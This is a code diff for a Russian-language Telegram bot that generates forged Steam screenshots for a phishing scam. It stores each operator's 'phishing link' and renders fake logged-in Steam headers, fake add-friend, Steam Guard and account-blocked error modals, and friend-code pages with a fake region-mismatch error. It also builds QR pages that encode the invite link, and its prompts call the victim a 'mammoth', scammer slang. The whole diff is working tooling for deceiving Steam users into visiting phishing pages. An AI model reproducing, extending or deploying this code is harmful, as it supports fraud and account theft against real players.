@@ -17,9 +17,11 @@ import { escapeHtml, nowIso } from "./utils/text";
 
 type Ctx = any;
 type StatsRangeKey = "today" | "week" | "month" | "all";
+type ProfileDrawMode = "add_friend" | "acc_blocked" | "steam_guard_error";
 type UserFlow =
   | { mode: "online_watch_profile_input" }
   | { mode: "online_watch_comment_input"; payload: { profileUrl: string } }
+  | { mode: "settings_phishing_link" }
   | { mode: "admin_logs_search" }
   | { mode: "admin_find_user"; payload: { returnPage: number } }
   | { mode: "draw_input:add_friend"; payload: { variant: "link" | "id"; promptMessageId: number | null } }
@@ -29,10 +31,8 @@ type UserFlow =
   | { mode: "draw_input:code_cs2"; payload: { variant: "fake" | "not_found"; promptMessageId: number | null } }
   | { mode: "draw_input:code_cs2_mammoth_code"; payload: { profileUrl: string; promptMessageId: number | null } }
   | { mode: "draw_input:code_dota2_mammoth_code"; payload: { promptMessageId: number | null } }
-  | { mode: "draw_input:qr_page_link"; payload: { promptMessageId: number | null } }
   | { mode: "draw_input:qr_page_time"; payload: { inviteLink: string; promptMessageId: number | null } }
-  | { mode: "draw_input:friend_page"; payload: { variant: "normal" | "not_found"; promptMessageId: number | null } }
-  | { mode: "draw_input:friend_page_code"; payload: { inviteLink: string; promptMessageId: number | null } };
+  | { mode: "draw_input:friend_page_code"; payload: { inviteLink: string; showRegionMismatch: boolean; promptMessageId: number | null } };
 
 type RuntimeWatch = {
   onlineSince: number;
@@ -58,6 +58,15 @@ type SteamProfileData = {
   rightColHtml: string | null;
 };
 
+type InvitePageData = {
+  name: string;
+  avatarFull: string;
+  avatarMedium: string | null;
+  avatarFrame: string | null;
+  miniprofile: string;
+  profileUrl: string | null;
+};
+
 if (!BOT_TOKEN) {
   throw new Error("BOT_TOKEN missing");
 }
@@ -78,8 +87,10 @@ let onlineWatchLoopStarted = false;
 
 const steamIdResolveCache = new Map<string, { steamId: string; updatedAt: number }>();
 const steamProfileCache = new Map<string, SteamProfileData & { updatedAt: number }>();
+const invitePageCache = new Map<string, InvitePageData & { updatedAt: number }>();
 const STEAM_ABORT_RESOURCE_TYPES = new Set(["media", "font", "websocket"]);
 const STEAM_SCREENSHOT_CLIP_DEFAULT = { x: 0, y: 122, width: 1920, height: 810 };
+const STEAM_SCREENSHOT_CLIP_WITH_HEADER = { x: 0, y: 0, width: 1920, height: 932 };
 const STEAM_FRIEND_TEMPLATE_VIEWPORT = { width: 1920, height: 1080 };
 const STEAM_FRIEND_FALLBACK_AVATAR_URL = "https://avatars.akamai.steamstatic.com/fef49e7fa7e1997310d705b2a6158ff8dc1cdfeb_full.jpg";
 
@@ -90,7 +101,6 @@ let steamSourcePage: any = null;
 let steamTemplatePage: any = null;
 let steamReadyPromise: Promise<void> | null = null;
 let steamRenderChain: Promise<unknown> = Promise.resolve();
-
 function appState() {
   return store.getState() as any;
 }
@@ -167,6 +177,57 @@ function hasRole(user: any, roles: Role[]) {
 
 function getMainKeyboard(user: any) {
   return mainKbForRole(hasRole(user, ["ADMIN"]));
+}
+
+function getUserPhishingLink(userId: number) {
+  const prefs = store.ensureUserPrefs(userId) as any;
+  const link = String(prefs?.phishing_link || "").trim();
+  return link || null;
+}
+
+function setUserPhishingLink(userId: number, link: string) {
+  const prefs = store.ensureUserPrefs(userId) as any;
+  prefs.phishing_link = link;
+  saveState();
+}
+
+function parseHttpUrl(raw: string) {
+  try {
+    const parsed = new URL(String(raw || "").trim());
+    if (!/^https?:$/i.test(parsed.protocol)) return null;
+    return parsed.toString();
+  } catch {
+    return null;
+  }
+}
+
+async function renderSettingsMenu(ctx: Ctx, user: any) {
+  const phishingLink = getUserPhishingLink(user.id);
+  await replaceOrReply(ctx, `<b>⚙️ Настройки</b>\n\nФишинг-ссылка: <b>${phishingLink ? escapeHtml(phishingLink) : "не установлена"}</b>`, {
+    parse_mode: "HTML",
+    link_preview_options: { is_disabled: true },
+    reply_markup: Markup.inlineKeyboard([
+      [Markup.button.callback("🔗 Установить фишинг-ссылку", "settings:set_phishing")],
+    ]).reply_markup,
+  });
+}
+
+async function askSetPhishingLinkFromDraw(ctx: Ctx) {
+  state.delete(ctx.from.id);
+  await replaceOrReply(ctx, `<b>Сначала установите фишинг-ссылку в главном меню → Настройки.</b>`, {
+    parse_mode: "HTML",
+    reply_markup: Markup.inlineKeyboard([
+      [Markup.button.callback("⚙️ Открыть настройки", "settings:menu")],
+      [Markup.button.callback("⬅️ Назад", "draw:menu")],
+    ]).reply_markup,
+  });
+}
+
+async function getRequiredPhishingLink(ctx: Ctx, user: any) {
+  const link = getUserPhishingLink(user.id);
+  if (link) return link;
+  await askSetPhishingLinkFromDraw(ctx);
+  return null;
 }
 
 function formatCountLabel(value: number, singular: string, plural: string) {
@@ -776,6 +837,22 @@ async function runDrawJob(ctx: Ctx, job: () => Promise<string>, errorMessage: st
   }
 }
 
+function makeProfileDrawScreenshot(
+  profileUrl: string,
+  drawMode: ProfileDrawMode,
+  variant: "link" | "id",
+  headerInviteUrl?: string,
+) {
+  return makeSteamProfileScreenshot(profileUrl, {
+    includeTopBar: Boolean(headerInviteUrl),
+    headerInviteUrl,
+    showAddFriendErrorModal: drawMode === "add_friend" || drawMode === "steam_guard_error",
+    showAddFriendInviteBanner: variant === "link",
+    showAccountBlockedModal: drawMode === "acc_blocked",
+    addFriendErrorTextVariant: drawMode === "steam_guard_error" ? "steam_guard" : "default",
+  });
+}
+
 async function handleDrawInput(ctx: Ctx, flow: Extract<UserFlow, { mode: string }>, rawText: string) {
   const promptMessageId = Number((flow as any).payload?.promptMessageId || 0);
   if (promptMessageId > 0) {
@@ -787,22 +864,6 @@ async function handleDrawInput(ctx: Ctx, flow: Extract<UserFlow, { mode: string 
 
   const mode = flow.mode.replace("draw_input:", "");
   const text = rawText.trim();
-
-  if (mode === "qr_page_link") {
-    try {
-      const parsed = new URL(text);
-      if (!/^https?:$/i.test(parsed.protocol)) throw new Error("bad");
-      const sent = await ctx.reply(`<b>Введите время для скриншота.</b>`, { parse_mode: "HTML" });
-      state.set(ctx.from.id, {
-        mode: "draw_input:qr_page_time",
-        payload: { inviteLink: parsed.toString(), promptMessageId: sent.message_id },
-      });
-      return;
-    } catch {
-      await ctx.reply("Нужна корректная ссылка http/https.");
-      return;
-    }
-  }
 
   if (mode === "qr_page_time") {
     const inviteLink = String((flow as any).payload?.inviteLink || "");
@@ -817,6 +878,7 @@ async function handleDrawInput(ctx: Ctx, flow: Extract<UserFlow, { mode: string 
 
   if (mode === "friend_page_code") {
     const inviteLink = String((flow as any).payload?.inviteLink || "");
+    const showRegionMismatch = Boolean((flow as any).payload?.showRegionMismatch);
     if (!inviteLink || !text) {
       await ctx.reply("Код друга не должен быть пустым.");
       return;
@@ -824,7 +886,7 @@ async function handleDrawInput(ctx: Ctx, flow: Extract<UserFlow, { mode: string 
     state.delete(ctx.from.id);
     await runDrawJob(
       ctx,
-      () => makeSteamFriendPageFromTemplateScreenshot(inviteLink, { variant: "not_found", friendCode: text }),
+      () => makeSteamFriendPageFromTemplateScreenshot(inviteLink, { variant: "not_found", friendCode: text, showRegionMismatch }),
       "Не удалось создать страницу друга.",
     );
     return;
@@ -859,31 +921,6 @@ async function handleDrawInput(ctx: Ctx, flow: Extract<UserFlow, { mode: string 
     return;
   }
 
-  if (mode === "friend_page") {
-    try {
-      const parsed = new URL(text);
-      if (!/^https?:$/i.test(parsed.protocol)) throw new Error("bad");
-      if ((flow as any).payload?.variant === "not_found") {
-        const sent = await ctx.reply(`<b>Введите код друга мамонта.</b>`, { parse_mode: "HTML" });
-        state.set(ctx.from.id, {
-          mode: "draw_input:friend_page_code",
-          payload: { inviteLink: parsed.toString(), promptMessageId: sent.message_id },
-        });
-        return;
-      }
-      state.delete(ctx.from.id);
-      await runDrawJob(
-        ctx,
-        () => makeSteamFriendPageFromTemplateScreenshot(parsed.toString(), { variant: "normal" }),
-        "Не удалось создать страницу друга.",
-      );
-      return;
-    } catch {
-      await ctx.reply("Нужна корректная фишинг-ссылка.");
-      return;
-    }
-  }
-
   const normalized = normalizeProfileInput(text);
   if (!normalized) {
     await ctx.reply(
@@ -901,6 +938,22 @@ async function handleDrawInput(ctx: Ctx, flow: Extract<UserFlow, { mode: string 
     return;
   }
 
+  if (mode === "add_friend" || mode === "acc_blocked" || mode === "steam_guard_error") {
+    const variant = (flow as any).payload?.variant === "link" ? "link" : "id";
+    const user = getUserByTgId(Number(ctx.from.id || 0));
+    const phishingLink = user ? await getRequiredPhishingLink(ctx, user) : null;
+    if (!phishingLink) {
+      return;
+    }
+    state.delete(ctx.from.id);
+    await runDrawJob(
+      ctx,
+      () => makeProfileDrawScreenshot(normalized.profileUrl, mode, variant, phishingLink),
+      "Не удалось создать скриншот.",
+    );
+    return;
+  }
+
   state.delete(ctx.from.id);
   await runDrawJob(
     ctx,
@@ -910,15 +963,6 @@ async function handleDrawInput(ctx: Ctx, flow: Extract<UserFlow, { mode: string 
       }
       if (mode === "code_cs2") {
         return makeSteamCodeCs2Screenshot(normalized.profileUrl);
-      }
-      const variant = (flow as any).payload?.variant;
-      if (mode === "add_friend" || mode === "acc_blocked" || mode === "steam_guard_error") {
-        return makeSteamProfileScreenshot(normalized.profileUrl, {
-          showAddFriendErrorModal: mode === "add_friend" || mode === "steam_guard_error",
-          showAddFriendInviteBanner: variant === "link",
-          showAccountBlockedModal: mode === "acc_blocked",
-          addFriendErrorTextVariant: mode === "steam_guard_error" ? "steam_guard" : "default",
-        });
       }
       return makeSteamProfileScreenshot(normalized.profileUrl);
     },
@@ -994,6 +1038,9 @@ async function prepareSteamPageForFastRender(page: any) {
     const request = route.request();
     const type = request.resourceType();
     const url = request.url().toLowerCase();
+    if (type === "font" && (url.startsWith("file:") || url.includes("steamstatic.com/public/shared/fonts/"))) {
+      return route.continue();
+    }
     if (STEAM_ABORT_RESOURCE_TYPES.has(type)) return route.abort();
     if (type === "image" && (url.includes("/videos/") || url.includes("broadcast"))) return route.abort();
     return route.continue();
@@ -1241,11 +1288,25 @@ async function fetchSteamProfileData(profileUrl: string): Promise<SteamProfileDa
   return result;
 }
 
-async function extractFriendPageDataFromInviteLink(inviteUrl: string) {
+async function loadInvitePageData(inviteUrl: string): Promise<InvitePageData> {
+  const cached = invitePageCache.get(inviteUrl);
+  if (cached && Date.now() - cached.updatedAt < 10 * 60 * 1000) {
+    return {
+      name: cached.name,
+      avatarFull: cached.avatarFull,
+      avatarMedium: cached.avatarMedium,
+      avatarFrame: cached.avatarFrame,
+      miniprofile: cached.miniprofile,
+      profileUrl: cached.profileUrl,
+    };
+  }
+
   try {
     await ensureSteamRendererReady();
     await steamSourcePage.goto(inviteUrl, { waitUntil: "domcontentloaded", timeout: 12000 });
-    await steamSourcePage.waitForTimeout(120);
+    await steamSourcePage
+      .waitForSelector(".actual_persona_name, .persona_name, .playerAvatarAutoSizeInner", { timeout: 1800 })
+      .catch(() => null);
     const parsed = (await steamSourcePage.evaluate(() => {
       const name =
         (document.querySelector(".actual_persona_name") as HTMLElement | null)?.innerText?.trim() ||
@@ -1290,7 +1351,7 @@ async function extractFriendPageDataFromInviteLink(inviteUrl: string) {
     const name = String(parsed?.name || "").trim();
     if (name && !/^sign\s*in$/i.test(name)) {
       const avatarFull = toAbs(parsed.avatarSrc || null) || STEAM_FRIEND_FALLBACK_AVATAR_URL;
-      return {
+      const result = {
         name,
         avatarFull,
         avatarMedium: avatarFull ? avatarFull.replace(/_full\.(jpg|png|webp)$/i, "_medium.$1") : null,
@@ -1298,10 +1359,12 @@ async function extractFriendPageDataFromInviteLink(inviteUrl: string) {
         miniprofile: String(parsed.miniprofile || ""),
         profileUrl: toAbs(parsed.profileUrl || null),
       };
+      invitePageCache.set(inviteUrl, { ...result, updatedAt: Date.now() });
+      return result;
     }
   } catch {}
 
-  return {
+  const fallback = {
     name: "Cute",
     avatarFull: STEAM_FRIEND_FALLBACK_AVATAR_URL,
     avatarMedium: STEAM_FRIEND_FALLBACK_AVATAR_URL.replace(/_full\.jpg$/i, "_medium.jpg"),
@@ -1309,6 +1372,8 @@ async function extractFriendPageDataFromInviteLink(inviteUrl: string) {
     miniprofile: "",
     profileUrl: inviteUrl,
   };
+  invitePageCache.set(inviteUrl, { ...fallback, updatedAt: Date.now() });
+  return fallback;
 }
 
 const PROFILE_ACTIONS_HTML = `<a role="button" id="btn_add_friend" class="btn_profile_action btn_medium" href="javascript:void(0)"><span>Add Friend</span></a>
@@ -1362,6 +1427,8 @@ async function waitForSteamTemplateAvatar(page: any) {
 async function makeSteamProfileScreenshot(
   profileUrl: string,
   options?: {
+    includeTopBar?: boolean;
+    headerInviteUrl?: string;
     showAddFriendErrorModal?: boolean;
     showAddFriendInviteBanner?: boolean;
     showAccountBlockedModal?: boolean;
@@ -1370,15 +1437,235 @@ async function makeSteamProfileScreenshot(
 ) {
   const task = async () => {
     const isAddFriendRender = Boolean(options?.showAddFriendErrorModal || options?.showAddFriendInviteBanner);
+    const screenshotClip = options?.includeTopBar ? STEAM_SCREENSHOT_CLIP_WITH_HEADER : STEAM_SCREENSHOT_CLIP_DEFAULT;
     await ensureSteamRendererReady();
     const page = isAddFriendRender ? steamAddFriendPage : steamPage;
     const tmpDir = await fs.mkdtemp(path.join(process.cwd(), ".tmp-steam-profile-"));
     const screenshotPath = path.join(tmpDir, `profile_${Date.now()}.png`);
+    const headerPromise = options?.headerInviteUrl ? loadInvitePageData(options.headerInviteUrl) : Promise.resolve(null);
     await page.goto(profileUrl, { waitUntil: "domcontentloaded", timeout: 12000 });
     if (isAddFriendRender) {
       await ensureSteamProfileQuickLoaded(page);
     } else {
       await ensureSteamProfileFullyLoaded(page);
+    }
+    const authenticatedHeader = await headerPromise;
+    if (authenticatedHeader) {
+      await page.evaluate((data: { name: string; avatarFull: string }) => {
+        const currentHeader = document.querySelector("#global_header") as HTMLElement | null;
+        const content = currentHeader?.querySelector(":scope > .content") as HTMLElement | null;
+        const navigation = currentHeader?.querySelector(".supernav_container") as HTMLElement | null;
+        const actions = currentHeader?.querySelector("#global_actions") as HTMLElement | null;
+        if (!currentHeader || !content || !navigation || !actions) throw new Error("Unable to apply authenticated Steam header");
+
+        navigation.innerHTML = `
+          <a class="menuitem supernav" href="https://store.steampowered.com/">STORE</a>
+          <a class="menuitem supernav" href="https://steamcommunity.com/">COMMUNITY</a>
+          <a class="menuitem supernav supernav_active username" href="https://steamcommunity.com/my/"></a>
+          <a class="menuitem" href="https://steamcommunity.com/chat/">CHAT</a>
+          <a class="menuitem" href="https://help.steampowered.com/en/">SUPPORT</a>
+        `;
+        const username = navigation.querySelector(".username") as HTMLElement | null;
+        if (username) username.textContent = data.name;
+
+        actions.innerHTML = `
+          <div role="navigation" id="global_action_menu" aria-label="Account Menu">
+            <a class="header_installsteam_btn header_installsteam_btn_gray" href="https://store.steampowered.com/about/">
+              <div class="header_installsteam_btn_content">Install Steam</div>
+            </a>
+            <div id="header_notification_area">
+              <button id="green_envelope_menu_root" class="_1jW5_Ycv6jGKu28A1OSIQK _2Hpe0_DGY0TBz45Lg0zUr9">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36" fill="none" class="_13fwmIK8Ajo0qndUS5zb7E" aria-label="Notifications">
+                  <g class="SVGIcon_Notification">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M32 24V26H4V24L8 19V12C8 9.34784 9.05357 6.8043 10.9289 4.92893C12.8043 3.05357 15.3478 2 18 2C20.6522 2 23.1957 3.05357 25.0711 4.92893C26.9464 6.8043 28 9.34784 28 12V19L32 24Z" fill="currentColor"></path>
+                    <path class="SVGIcon_Notification_Uvula" fill-rule="evenodd" clip-rule="evenodd" d="M18 34C19.2396 33.9986 20.4483 33.6133 21.46 32.897C22.4718 32.1807 23.2368 31.1687 23.65 30H12.35C12.7632 31.1687 13.5282 32.1807 14.54 32.897C15.5517 33.6133 16.7604 33.9986 18 34Z" fill="currentColor"></path>
+                  </g>
+                </svg>
+              </button>
+            </div>
+            <button class="pulldown global_action_link persona_name_text_content" id="account_pulldown"></button>
+            <div id="header_wallet_ctn">
+              <a class="global_action_link" id="header_wallet_balance" href="https://store.steampowered.com/account/store_transactions/">$ 0.12</a>
+            </div>
+          </div>
+          <a href="https://steamcommunity.com/my/" class="user_avatar playerAvatar online" aria-label="View your profile">
+            <img alt="">
+          </a>
+        `;
+        const accountName = actions.querySelector("#account_pulldown") as HTMLElement | null;
+        if (accountName) accountName.textContent = data.name;
+        const avatar = actions.querySelector(".user_avatar img") as HTMLImageElement | null;
+        if (avatar) {
+          avatar.src = data.avatarFull;
+          avatar.srcset = data.avatarFull;
+          avatar.alt = data.name;
+        }
+
+        document.querySelector("#codex-authenticated-header-style")?.remove();
+        const style = document.createElement("style");
+        style.id = "codex-authenticated-header-style";
+        style.textContent = `
+          div#global_header .content {
+            position: relative !important;
+            width: 940px !important;
+            min-width: 940px !important;
+            max-width: 940px !important;
+            height: 104px !important;
+            margin: 0 auto !important;
+          }
+          div#global_header div.logo {
+            float: left !important;
+            padding-top: 30px !important;
+            margin-right: 40px !important;
+            width: 176px !important;
+            height: 44px !important;
+          }
+          #global_header .supernav_container {
+            position: absolute !important;
+            left: 200px !important;
+            top: 0 !important;
+          }
+          div#global_actions {
+            position: absolute !important;
+            right: 0 !important;
+            top: 6px !important;
+            width: 268px !important;
+            height: 46px !important;
+            line-height: 21px !important;
+            z-index: 401 !important;
+            white-space: nowrap !important;
+            color: #b8b6b4 !important;
+            font-size: 11px !important;
+          }
+          div#global_actions #global_action_menu {
+            position: absolute !important;
+            left: 0 !important;
+            top: 0 !important;
+            display: block !important;
+            width: 230px !important;
+            height: 46px !important;
+            line-height: 24px !important;
+          }
+          div#global_actions .header_installsteam_btn {
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+            right: auto !important;
+            width: 111px !important;
+            height: 22px !important;
+            line-height: 22px !important;
+          }
+          div#global_actions .header_installsteam_btn_content {
+            height: 22px !important;
+            line-height: 22px !important;
+          }
+          div#global_actions #header_notification_area {
+            position: absolute !important;
+            top: 0 !important;
+            left: 116px !important;
+            right: auto !important;
+            display: block !important;
+            width: 44px !important;
+            height: 24px !important;
+            line-height: 24px !important;
+          }
+          div#global_actions #green_envelope_menu_root {
+            position: absolute !important;
+            left: 0 !important;
+            top: 0 !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            width: 44px !important;
+            height: 24px !important;
+            min-width: 44px !important;
+            min-height: 24px !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            border: 0 !important;
+            border-radius: 0 !important;
+            background: #5c7e10 !important;
+            color: #dfe3da !important;
+            transform: none !important;
+          }
+          div#global_actions #green_envelope_menu_root svg {
+            width: 14px !important;
+            height: 14px !important;
+            margin: 0 !important;
+            color: #ffffff !important;
+            fill: none !important;
+          }
+          div#global_actions #account_pulldown {
+            position: absolute !important;
+            top: 1px !important;
+            left: 168px !important;
+            right: auto !important;
+            height: 24px !important;
+            line-height: 24px !important;
+            padding: 0 10px 0 0 !important;
+            max-width: 61px !important;
+            overflow: hidden !important;
+            text-overflow: ellipsis !important;
+            border: none !important;
+            background: transparent !important;
+            color: #b8b6b4 !important;
+            font: inherit !important;
+          }
+          div#global_actions #account_pulldown::after {
+            content: "" !important;
+            position: absolute !important;
+            right: 0 !important;
+            top: 10px !important;
+            border-left: 4px solid transparent !important;
+            border-right: 4px solid transparent !important;
+            border-top: 4px solid #b8b6b4 !important;
+          }
+          div#global_actions #header_wallet_ctn {
+            position: absolute !important;
+            top: 28px !important;
+            left: 176px !important;
+            right: auto !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            text-align: left !important;
+            line-height: 13px !important;
+          }
+          div#global_actions #header_wallet_balance {
+            display: block !important;
+            padding: 0 !important;
+            line-height: 13px !important;
+          }
+          div#global_actions .user_avatar {
+            position: absolute !important;
+            top: 0 !important;
+            left: 234px !important;
+            right: auto !important;
+            display: block !important;
+            width: 34px !important;
+            height: 34px !important;
+            margin: 0 !important;
+          }
+          div#global_actions .user_avatar img {
+            display: block !important;
+            width: 32px !important;
+            height: 32px !important;
+          }
+          .responsive_header, .responsive_page_menu_ctn, .responsive_page_content_overlay {
+            display: none !important;
+          }
+        `;
+        document.head.appendChild(style);
+      }, {
+        name: authenticatedHeader.name,
+        avatarFull: authenticatedHeader.avatarFull || STEAM_FRIEND_FALLBACK_AVATAR_URL,
+      });
+      await page
+        .waitForFunction(() => {
+          const signIn = document.querySelector("#global_header .global_action_link[href*='login']");
+          const avatar = document.querySelector("#global_actions .user_avatar img") as HTMLImageElement | null;
+          return Boolean(!signIn && avatar && avatar.complete && avatar.naturalWidth > 0);
+        }, { timeout: 2000, polling: 60 })
+        .catch(() => null);
     }
     await page.evaluate(({ actionsHtml }: { actionsHtml: string }) => {
       const actions = document.querySelector(".profile_header_actions") as HTMLElement | null;
@@ -1399,14 +1686,15 @@ async function makeSteamProfileScreenshot(
           ? STEAM_GUARD_ERROR_MODAL_HTML
           : ADD_FRIEND_ERROR_MODAL_HTML;
       await page.evaluate(
-        ({ html, clip }: { html: string; clip: { x: number; y: number; width: number; height: number } }) => {
+        ({ html, clip, dimTopBar }: { html: string; clip: { x: number; y: number; width: number; height: number }; dimTopBar: boolean }) => {
           document.querySelector(".newmodal_background")?.remove();
           document.querySelector(".newmodal")?.remove();
+          document.querySelector("#codex-modal-no-shadow")?.remove();
           const overlay = document.createElement("div");
           overlay.className = "newmodal_background";
           overlay.style.opacity = "0.8";
-          overlay.style.top = `${clip.y}px`;
-          overlay.style.height = `calc(100% - ${clip.y}px)`;
+          overlay.style.top = dimTopBar ? "0" : `${clip.y}px`;
+          overlay.style.height = dimTopBar ? "100%" : `calc(100% - ${clip.y}px)`;
           document.body.appendChild(overlay);
           document.body.insertAdjacentHTML("beforeend", html);
           const style = document.createElement("style");
@@ -1427,18 +1715,26 @@ async function makeSteamProfileScreenshot(
           document.head.appendChild(style);
           const modal = document.querySelector(".newmodal") as HTMLElement | null;
           if (modal) {
-            modal.style.left = `${clip.x + clip.width / 2}px`;
-            modal.style.top = `${clip.y + clip.height / 2}px`;
-            modal.style.transform = "translate(-50%, -50%)";
+            modal.style.position = "absolute";
+            modal.style.margin = "0";
+            modal.style.right = "auto";
+            modal.style.bottom = "auto";
+            modal.style.transform = "none";
+            const modalWidth = modal.offsetWidth || modal.getBoundingClientRect().width || 500;
+            const modalHeight = modal.offsetHeight || modal.getBoundingClientRect().height || 168;
+            const left = clip.x + Math.round((clip.width - modalWidth) / 2);
+            const top = clip.y + Math.round((clip.height - modalHeight) / 2);
+            modal.style.left = `${left}px`;
+            modal.style.top = `${top}px`;
           }
         },
-        { html: modalHtml, clip: STEAM_SCREENSHOT_CLIP_DEFAULT },
+        { html: modalHtml, clip: screenshotClip, dimTopBar: Boolean(authenticatedHeader) },
       );
     }
 
     await page.waitForTimeout(55);
     await page.evaluate(() => window.scrollTo(0, 0));
-    await page.screenshot({ path: screenshotPath, clip: STEAM_SCREENSHOT_CLIP_DEFAULT });
+    await page.screenshot({ path: screenshotPath, clip: screenshotClip });
     return screenshotPath;
   };
 
@@ -1462,11 +1758,11 @@ async function resolveSteamFriendTemplatePath() {
 
 async function makeSteamFriendPageFromTemplateScreenshot(
   inviteUrl: string,
-  options?: { variant?: "normal" | "not_found"; friendCode?: string },
+  options?: { variant?: "normal" | "not_found"; friendCode?: string; showRegionMismatch?: boolean },
 ) {
   const task = async () => {
     await ensureSteamRendererReady();
-    const profile = await extractFriendPageDataFromInviteLink(inviteUrl);
+    const profile = await loadInvitePageData(inviteUrl);
     const templatePath = await resolveSteamFriendTemplatePath();
     const templateDir = path.dirname(templatePath);
     const templateBase = path.basename(templatePath, path.extname(templatePath));
@@ -1481,6 +1777,7 @@ async function makeSteamFriendPageFromTemplateScreenshot(
     await steamTemplatePage.setViewportSize(STEAM_FRIEND_TEMPLATE_VIEWPORT);
     await steamTemplatePage.goto(`file:///${tempHtmlPath.replace(/\\/g, "/")}`, { waitUntil: "domcontentloaded", timeout: 12000 });
     await steamTemplatePage.waitForLoadState("networkidle", { timeout: 5000 }).catch(() => null);
+    await steamTemplatePage.evaluate(() => document.fonts?.ready).catch(() => null);
     await steamTemplatePage.waitForTimeout(220);
 
     await steamTemplatePage.evaluate(
@@ -1494,6 +1791,7 @@ async function makeSteamFriendPageFromTemplateScreenshot(
         friendCode: string;
         inviteLink: string;
         variant: "normal" | "not_found";
+        showRegionMismatch: boolean;
       }) => {
         const setText = (selector: string, value: string) => {
           const element = document.querySelector(selector);
@@ -1696,7 +1994,7 @@ async function makeSteamFriendPageFromTemplateScreenshot(
         }
 
         document.querySelector("#codex-region-mismatch")?.remove();
-        if (data.variant === "not_found" && friendCodeInput) {
+        if (data.variant === "not_found" && data.showRegionMismatch && friendCodeInput) {
           const selector =
             (friendCodeInput.closest("._3nmSpgo_T_V0-Er7h8J2Ar") as HTMLElement | null) ||
             (friendCodeInput.parentElement as HTMLElement | null);
@@ -1733,6 +2031,7 @@ async function makeSteamFriendPageFromTemplateScreenshot(
         friendCode: String(options?.friendCode || "11016760945"),
         inviteLink: inviteUrl,
         variant: options?.variant === "not_found" ? "not_found" : "normal",
+        showRegionMismatch: Boolean(options?.showRegionMismatch),
       },
     );
 
@@ -1775,7 +2074,7 @@ async function makeSteamQrPageScreenshot(displayTime: string, inviteLink: string
     const tempHtmlPath = path.join(tmpDir, `qr_${Date.now()}.html`);
     const screenshotPath = path.join(tmpDir, `qr_${Date.now()}.png`);
     const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=420x420&margin=0&data=${encodeURIComponent(inviteLink)}`;
-    const profile = await extractFriendPageDataFromInviteLink(inviteLink);
+    const profile = await loadInvitePageData(inviteLink);
     const html = `<!doctype html>
 <html>
 <head>
@@ -2026,7 +2325,22 @@ async function makeDota2CodeNotFoundScreenshot(mammothCode: string) {
     html, body { margin: 0; padding: 0; overflow: hidden; background: #000; }
     body { position: relative; }
     .bg { position: absolute; left: 0; top: 0; width: auto; height: auto; }
-    .code { position: absolute; left: 802px; top: 243.5px; font-family: "Radiance", sans-serif; color: #b0b8cb; font-size: 18px; line-height: 22px; white-space: nowrap; }
+    .code {
+      position: absolute;
+      left: 802px;
+      top: 243.5px;
+      font-family: "Radiance", sans-serif;
+      color: #c8ccd6;
+      font-size: 18.75px;
+      line-height: 22px;
+      white-space: nowrap;
+      letter-spacing: 0.2px;
+      text-shadow:
+        0 1px 1px rgba(0, 0, 0, 0.75),
+        0 0 2px rgba(210, 216, 230, 0.35);
+      -webkit-font-smoothing: antialiased;
+      text-rendering: geometricPrecision;
+    }
   </style>
 </head>
 <body>
@@ -2060,6 +2374,7 @@ bot.on("text", async (ctx) => {
   const trimmed = text.trim();
   const normalized = trimmed.normalize("NFKC").replace(/\uFE0F/g, "");
   const plain = normalized.replace(/^[^\p{L}\p{N}]+/u, "").trim();
+  const isSettingsBtn = plain.startsWith("Настройки");
   const isDrawBtn = plain.startsWith("Отрисовка");
   const isOnlineBtn = plain.startsWith("Чекер онлайна");
 
@@ -2079,11 +2394,16 @@ bot.on("text", async (ctx) => {
     return;
   }
 
-  if (isDrawBtn || isOnlineBtn) {
+  if (isDrawBtn || isOnlineBtn || isSettingsBtn) {
     if (isDrawBtn) {
       await clearUserFlowOnly(ctx);
       await renderDrawMenu(ctx);
       logEvent(me, "draw", "open_menu");
+      return;
+    }
+    if (isSettingsBtn) {
+      await clearUserFlowOnly(ctx);
+      await renderSettingsMenu(ctx, me);
       return;
     }
     await clearUserFlowOnly(ctx);
@@ -2097,6 +2417,18 @@ bot.on("text", async (ctx) => {
   }
 
   const flow = state.get(ctx.from.id);
+
+  if (flow?.mode === "settings_phishing_link") {
+    const parsed = parseHttpUrl(trimmed);
+    if (!parsed) {
+      await ctx.reply("Нужна корректная фишинг-ссылка http/https.");
+      return;
+    }
+    state.delete(ctx.from.id);
+    setUserPhishingLink(me.id, parsed);
+    await renderSettingsMenu(ctx, me);
+    return;
+  }
 
   if (flow?.mode === "admin_logs_search" && hasRole(me, ["ADMIN"])) {
     adminLogsViewState.set(ctx.from.id, { query: trimmed });
@@ -2159,6 +2491,23 @@ bot.on("callback_query", async (ctx, next) => {
   const data = String(ctx.callbackQuery.data || "");
 
   if (data === "admin:userlist:noop" || data === "logs:noop") {
+    await ctx.answerCbQuery().catch(() => null);
+    return;
+  }
+
+  if (data === "settings:menu") {
+    await clearUserFlowOnly(ctx);
+    await renderSettingsMenu(ctx, me);
+    await ctx.answerCbQuery().catch(() => null);
+    return;
+  }
+
+  if (data === "settings:set_phishing") {
+    state.set(ctx.from.id, { mode: "settings_phishing_link" });
+    await replaceOrReply(ctx, `<b>Введите фишинг-ссылку.</b>`, {
+      parse_mode: "HTML",
+      reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Назад", "settings:menu")]]).reply_markup,
+    });
     await ctx.answerCbQuery().catch(() => null);
     return;
   }
@@ -2245,7 +2594,21 @@ bot.on("callback_query", async (ctx, next) => {
     return;
   }
 
-  if (data === "draw:add_friend" || data === "draw:acc_blocked" || data === "draw:steam_guard_error") {
+  if (data === "draw:acc_blocked" || data === "draw:steam_guard_error") {
+    const mode = data === "draw:acc_blocked" ? "acc_blocked" : "steam_guard_error";
+    state.set(ctx.from.id, {
+      mode: `draw_input:${mode}` as "draw_input:acc_blocked" | "draw_input:steam_guard_error",
+      payload: { variant: "id", promptMessageId: (ctx.callbackQuery as any)?.message?.message_id || null },
+    });
+    await replaceOrReply(ctx, `<b>Пришлите ссылку на профиль или SteamID.</b>`, {
+      parse_mode: "HTML",
+      reply_markup: Markup.inlineKeyboard([[Markup.button.callback("⬅️ Назад", "draw:menu")]]).reply_markup,
+    });
